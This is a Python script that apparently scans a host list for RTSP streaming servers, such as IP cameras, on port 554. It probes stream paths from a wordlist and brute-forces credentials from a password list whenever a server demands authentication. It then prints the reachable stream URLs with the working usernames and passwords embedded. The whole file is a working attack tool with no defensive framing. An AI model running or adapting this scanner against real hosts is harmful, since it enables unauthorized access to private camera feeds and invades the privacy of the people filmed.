#!/usr/bin/env python
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
from pathlib import Path
from socket import SOL_SOCKET, SO_BINDTODEVICE, SocketIO, create_connection, setdefaulttimeout, socket, timeout
from time import sleep, time

from fire import Fire
from tqdm import tqdm


root_path = '/'

work_dir = Path(os.path.dirname(os.path.abspath(__file__)))

data_dir = work_dir / 'data'
local_dir = work_dir / 'local'

paths_file = data_dir / 'rtsp_paths.txt'
creds_file = data_dir / 'rtsp_creds.txt'

paths = [root_path] + [ln.rstrip() for ln in open(paths_file)]
creds = [ln.rstrip() for ln in open(creds_file)]

cseqs = dict()
debug = False


def query(connection: socket, url='*'):
    method = 'OPTIONS' if url == '*' else 'DESCRIBE'

    if url == '*':
        cseq = 0
    else:
        cseq = cseqs.get(connection, 0)

    cseq += 1

    cseqs[connection] = cseq

    request = (
        '%s %s RTSP/1.0\r\n'
        'CSeq: %d\r\n'
        '\r\n'
    ) % (method, url, cseq)

    if debug:
        print('<< %s', request)

    try:
        connection.sendall(request.encode())
        response = connection.recv(1024).decode()

        if debug:
            print('>> %s' % response)

        if response.startswith('RTSP/'):
            _, code, _ = response.split(None, 2)
            code = int(code)
            if code == 401 and 'digest' in response.lower():
                return 500  # lazy to implement for now
            return code

    except KeyboardInterrupt:
        raise
    except BrokenPipeError:
        pass
    except timeout:
        pass
    except ConnectionResetError:
        pass
    except UnicodeDecodeError:
        pass
    except:
        pass

    return 500


def get_url(host, port=554, path='', cred=''):
    if cred:
        cred = '%s@' % cred
    return 'rtsp://%s%s:%d%s' % (cred, host, port, path)


def connect(host, port, interface) -> SocketIO:
    start = time()

    # for OSError, timeout handled only once
    while time() - start < 3:
        try:
            c = create_connection((host, int(port)), 3)
            if interface:
                c.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, interface.encode())
            return c
        except KeyboardInterrupt:
            raise
        except timeout:
            return
        except OSError:
            sleep(1)
        except:
            return


def process_target(target_params):
    host, port, single_path, interface = target_params
    connection = connect(host, port, interface)

    results = []

    if not connection:
        return results  # next host

    with connection:
        # OPTIONS query
        code = query(connection)

        if not 200 <= code < 300:
            return results

        for path in paths:
            url = get_url(host, port, path)
            code = query(connection, url)

            if code >= 500:
                return results

            # 451 is bad URL in DESCRIBE request
            # can be just path or with "?" at end
            # but not care for now
            if code == 451:
                return results

            if 200 <= code < 300:
                results.append(url)

                if single_path or path == root_path:
                    return results

                continue

            if code == 401:
                # bruteforcing creds
                for cred in creds:
                    url = get_url(host, port, path, cred)
                    code = query(connection, url)

                    if code >= 500:
                        return results

                    if 200 <= code < 300:
                        results.append(url)
                        if single_path:
                            return results
                        break  # one cred per path is enough

                # if no one cred accepted,
                # we have no cred for another paths i think
                break

    return results


def main(H='', w=None, sp=False, i='', d=False):
    global debug
    debug = d
    results = []
    hosts_file = H or local_dir / 'hosts_554.txt'

    setdefaulttimeout(3)

    with ThreadPoolExecutor(w) as ex:
        with open(hosts_file) as hf:
            futures = {}

            for ln in hf:
                host = ln.rstrip()
                port = 554

                if ':' in host:
                    host, port = host.split(':')

                arg = (host, port, sp, i)

                future = ex.submit(process_target, arg)
                futures[future] = arg

            with tqdm(total=len(futures)) as pb:
                for future in as_completed(futures):
                    host, port, *_ = futures[future]
                    res = future.result()
                    pb.update()
                    results += res

    for r in results:
        print(r)


if __name__ == "__main__":
    try:
        Fire(main)
    except KeyboardInterrupt:
        print('Interrupted by user')
        exit(130)
